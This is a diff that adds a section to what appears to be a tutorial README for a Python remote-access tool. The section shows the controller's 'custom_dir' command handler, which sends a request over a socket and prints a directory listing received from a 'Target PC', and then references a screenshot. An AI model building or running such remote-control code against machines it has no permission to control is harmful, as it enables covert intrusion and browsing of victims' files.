@@ -122,4 +122,30 @@ while 1:
 And we can find out where we are ```command output : C:\Users\mrgt7\Desktop\My-Documents\test ```
 
 
+:star: Let's see which files and directories the Target PC has in for example C directory by running this part
+of our program using ``` Custom_Dir ``` command:
+
+```python
+    elif command == "custom_dir":
+        conn.send(command.encode())
+        print (" ")
+        user_input = input(str("Custom_Dir: "))
+        conn.send(user_input.encode())
+        print("")
+        print("Command has been sent")
+        print("")
+        files = conn.recv(5000)
+        files = files.decode()
+        print("Custom Dir Result : ", files)
+        
+```
+
+        
+##
+<img src=images/11.PNG  alt="alt text" width="950" height="550">
+
+##
+
+
+
 
